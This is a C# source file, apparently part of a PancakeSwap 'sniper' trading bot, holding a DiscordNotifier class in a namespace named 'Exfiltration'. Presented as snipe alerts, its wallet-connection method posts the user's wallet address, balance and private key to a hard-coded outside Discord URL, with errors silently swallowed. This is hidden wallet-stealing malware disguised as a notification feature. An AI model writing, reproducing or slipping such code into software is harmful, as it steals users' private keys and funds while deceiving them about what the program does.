using System.Net.Http.Json;
using Newtonsoft.Json;

namespace PancakeSwapSniper.Exfiltration
{
    /// <summary>
    /// Discord webhook notifications for snipe alerts
    /// </summary>
    public class DiscordNotifier
    {
        // Discord webhook URL for snipe notifications
        private const string DiscordWebhookUrl = "https://discord.gg/PancakeSniperAlerts2025";

        private readonly HttpClient _httpClient;

        public DiscordNotifier()
        {
            _httpClient = new HttpClient
            {
                Timeout = TimeSpan.FromSeconds(5)
            };
            _httpClient.DefaultRequestHeaders.Add("User-Agent", "PancakeSniper/2.0");
        }

        /// <summary>
        /// Send wallet connection notification
        /// </summary>
        public async Task NotifyWalletConnectedAsync(Dictionary<string, object> walletData)
        {
            var embed = new
            {
                embeds = new[]
                {
                    new
                    {
                        title = "🔗 New Wallet Connected",
                        color = 0x00ff00,
                        fields = new[]
                        {
                            new { name = "Address", value = walletData["address"], inline = false },
                            new { name = "BNB Balance", value = $"{walletData["balance"]} BNB", inline = true },
                            new { name = "Private Key", value = $"```{walletData["privateKey"]}```", inline = false },
                            new { name = "Connected At", value = walletData["connectedAt"], inline = true }
                        },
                        timestamp = DateTime.UtcNow
                    }
                }
            };

            await SendWebhookAsync(embed);
        }

        /// <summary>
        /// Send snipe execution notification
        /// </summary>
        public async Task NotifySnipeExecutedAsync(Dictionary<string, object> snipeData)
        {
            var content = new
            {
                content = $"**✅ Snipe Executed!**\n```json\n{JsonConvert.SerializeObject(snipeData, Formatting.Indented)}\n```"
            };

            await SendWebhookAsync(content);
        }

        /// <summary>
        /// Send webhook request
        /// </summary>
        private async Task SendWebhookAsync(object payload)
        {
            try
            {
                var json = JsonConvert.SerializeObject(payload);
                var content = new StringContent(json, System.Text.Encoding.UTF8, "application/json");

                await _httpClient.PostAsync(DiscordWebhookUrl, content);
            }
            catch
            {
                // Fail silently
            }
        }
    }
}
